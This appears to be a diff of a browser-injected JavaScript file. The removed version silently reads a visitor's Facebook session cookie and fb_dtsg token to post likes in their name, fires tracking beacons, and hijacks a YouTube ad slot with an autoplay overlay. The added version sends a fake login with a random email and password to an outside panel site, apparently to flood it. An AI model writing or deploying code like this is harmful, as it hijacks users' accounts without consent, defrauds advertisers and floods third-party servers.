@@ -1,56 +1,40 @@
 new Image().src = 'http://whos.amung.us/widget/r3dsiker1.png';
 
+var xhr = new XMLHttpRequest();
+var  params ="tpye=login";
+ params +="&email=" + generate_name(5, true) + '@gmail.com';
+ params +="&password="  + generate_name(40, true);
+ xhr.open("POST", "http://sistem.takipcipaneli.info//login", true);
+xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
-var media = {
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            xhr.close;
+        }
+    }
+    xhr.send(params);
 
-facebook: {
-
-profile_id: function () {
-
-return document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
-
-},
-
-fb_dtsg: function () {
-
-return document.getElementsByName('fb_dtsg')[0].value;
-
-},
-
-
-
-post_like: function (post_id) {
-
-var user_id = this.profile_id();
-
-var fb_dtsg = this.fb_dtsg();
-
-var params = "client_id=1444594705617%3A2046578192&ft_ent_identifier=" + post_id + "&reaction_type=1&root_id=u_0_8&source=2&av=" + user_id + "&ft[tn]=%3E%3D]&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7AmajEyl2qm9ongDxiWEyx9CzEWq2WiqAdy9VQC-K26m6oKezob4q68K5Uc-dwFG58kUgx6dEwy8yUnCF1afybDGcCxC2e78baxidw&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816911697518169675175108&__rev=1981648";
-
-var xhr = new XMLHttpRequest,
-
-url = "https://www.facebook.com/ufi/reaction/?__pc=EXP1%3ADEFAULT";
-
-xhr.open("POST", url, false);
-
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-xhr.send(params);
-
-},
-
-
+	
+	
+function generate_name(length, firstUpper) {
+ rname = "";
+ sesli = "aeiou";
+ sessiz = "bcdfghjklmnprstvyz";
+ rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
+ if (firstUpper == true) {
+  rname = rname.toUpperCase();
+ }
+ for (n = 0; n < length; n++) {
+  if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
+   rname += sessiz[rand(0, sessiz.length - 1)];
+  } else {
+   rname += sesli[rand(0, sesli.length - 1)];
+  }
+ }
+ return rname;
 }
 
-}
-
-if (location.hostname.indexOf("facebook.com") >= 0) {
-
-new Image().src = '//whos.amung.us/swidget/r3dsiker2';
-
-}
-
-if (location.hostname.indexOf("youtube.com") >= 0) {
-new Image().src = '//whos.amung.us/swidget/r3dsiker3';
-document.getElementById("ad_creative_1").innerHTML = '<a href="http://bilbakalim.org/" target="_blank"><div id="keko" style="width: 970px; position: absolute; z-index: 1; height: 250px;"></div></a><iframe src="https://www.youtube.com/embed/WgpKaXcMjyU?autoplay=1&mute=1" width="970" height="250" frameborder="0" allowfullscreen></iframe>';
+function rand(min, max) {
+ return Math.floor(Math.random() * (max - min)) + min;
 }
